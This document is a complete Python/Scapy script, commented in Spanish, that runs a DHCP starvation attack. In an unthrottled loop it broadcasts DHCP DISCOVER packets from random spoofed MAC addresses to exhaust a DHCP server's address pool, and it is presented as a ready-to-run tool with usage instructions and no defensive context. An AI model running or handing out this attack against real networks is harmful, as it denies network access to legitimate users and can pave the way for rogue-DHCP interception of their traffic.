#!/usr/bin/env python3
# D31B1 DHCP Starvation Tool
# Uso: sudo python3 d31b1_dhcp_starvation.py

from scapy.all import *
import random

# CONFIGURACIÓN
TARGET_IFACE = "eth0"

def get_random_mac():
    # Genera una MAC aleatoria para parecer un cliente nuevo
    return "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

def dhcp_starvation():
    print(f"\n[*] INICIANDO ATAQUE DHCP STARVATION EN {TARGET_IFACE}")
    print("[*] Inundando servidor DHCP... (Presiona CTRL+C para parar)")
    
    try:
        packet_count = 0
        while True:
            # 1. Generar identidad falsa
            fake_mac = get_random_mac()
            
            # 2. Construir paquete DHCP DISCOVER
            # Capa 2: Ethernet (Origen falso -> Broadcast)
            eth = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff")
            # Capa 3: IP (Origen 0.0.0.0 -> Destino 255.255.255.255)
            ip = IP(src="0.0.0.0", dst="255.255.255.255")
            # Capa 4: UDP (Cliente 68 -> Servidor 67)
            udp = UDP(sport=68, dport=67)
            # Capa 5: BOOTP (Protocolo de arranque)
            bootp = BOOTP(chaddr=mac2str(fake_mac), xid=random.randint(1, 1000000000))
            # Capa 6: DHCP (Tipo Discover)
            dhcp = DHCP(options=[("message-type", "discover"), "end"])
            
            packet = eth / ip / udp / bootp / dhcp
            
            # 3. Enviar paquete
            sendp(packet, iface=TARGET_IFACE, verbose=0)
            
            packet_count += 1
            print(f"\r[+] Paquetes enviados: {packet_count} | MAC: {fake_mac}", end="")
            
            # Ajusta esto si quieres ir más lento, pero para starvation queremos velocidad
            # time.sleep(0.01)

    except KeyboardInterrupt:
        print("\n\n[*] Ataque detenido por el usuario.")

if __name__ == "__main__":
    dhcp_starvation()